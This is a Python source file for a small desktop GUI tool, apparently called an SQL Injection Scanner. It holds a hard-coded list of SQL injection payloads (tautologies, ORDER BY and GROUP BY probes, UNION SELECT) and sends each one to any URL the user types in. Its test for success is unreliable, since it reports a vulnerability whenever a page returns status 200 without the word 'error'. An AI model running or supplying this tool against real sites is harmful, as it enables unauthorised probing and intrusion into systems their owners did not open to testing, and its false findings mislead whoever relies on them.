import requests
import tkinter as tk
from tkinter import scrolledtext
from tkinter import messagebox

# Payloads to test for SQL Injection
payloads = [
    "' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1",
    "' OR 1 - - -", " OR \"\"= ", " OR 1 = 1 - - -", "' OR '' = '",
    "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
    "1' ORDER BY 1, 2--+", "1' ORDER BY 1, 2, 3--+",
    "1' GROUP BY 1, 2, --+", "1' GROUP BY 1, 2, 3--+",
    "' GROUP BY columnnames having 1= 1 - -", "-1' UNION SELECT 1, 2, 3--+",
    "OR 1 = 1", "OR 1 = 0", "OR 1= 1#", "OR 1 = 0#",
    "OR 1 = 1--", "OR 1= 0--", "HAVING 1 = 1", "HAVING 1= 0",
    "HAVING 1= 1#", "HAVING 1= 0#", "HAVING 1 = 1--", "HAVING 1 = 0--",
    "AND 1= 1", "AND 1= 0", "AND 1 = 1--", "AND 1 = 0--",
    "AND 1= 1#", "AND 1= 0#", "AND 1 = 1 AND '%' ='",
    "AND 1 = 0 AND '%' ='", "WHERE 1= 1 AND 1 = 1", "WHERE 1 = 1 AND 1 = 0",
    "WHERE 1 = 1 AND 1 = 1#", "WHERE 1 = 1 AND 1 = 0#",
    "WHERE 1 = 1 AND 1 = 1--", "WHERE 1 = 1 AND 1 = 0--",
    *["ORDER BY {}--".format(i) for i in range(1, 31)],
    "ORDER BY 31337--"
]

def scan_url():
    url = url_entry.get()
    if not url.startswith("http"):
        messagebox.showerror("Invalid URL", "Please enter a valid URL starting with http or https.")
        return
    
    output_text.delete("1.0", tk.END)
    output_text.insert(tk.END, f"[*] Scanning {url}...\n\n")
    root.update()

    for payload in payloads:
        try:
            r = requests.get(url + payload, timeout=5)
            if r.status_code == 200 and "error" not in r.text.lower():
                output_text.insert(tk.END, f"[+] Vulnerability found with payload: {payload}\n", "vuln")
                break
            else:
                output_text.insert(tk.END, f"[-] No vulnerability with payload: {payload}\n", "safe")
        except requests.exceptions.RequestException as e:
            output_text.insert(tk.END, f"[!] Error: {str(e)}\n", "error")
            break

    output_text.insert(tk.END, "\n[✓] Scan complete.\n")

# GUI Setup
root = tk.Tk()
root.title("SQL Injection Scanner")
root.geometry("700x500")
root.resizable(False, False)

tk.Label(root, text="Enter Target URL:", font=("Arial", 12)).pack(pady=10)
url_entry = tk.Entry(root, width=80, font=("Arial", 11))
url_entry.pack(pady=5)

scan_button = tk.Button(root, text="Scan", command=scan_url, font=("Arial", 12), bg="green", fg="white")
scan_button.pack(pady=10)

output_text = scrolledtext.ScrolledText(root, width=85, height=20, font=("Courier", 10))
output_text.tag_config("vuln", foreground="red")
output_text.tag_config("safe", foreground="blue")
output_text.tag_config("error", foreground="orange")
output_text.pack(pady=10)

tk.Button(root, text="Exit", command=root.quit, font=("Arial", 12), bg="gray", fg="white").pack(pady=5)

root.mainloop()
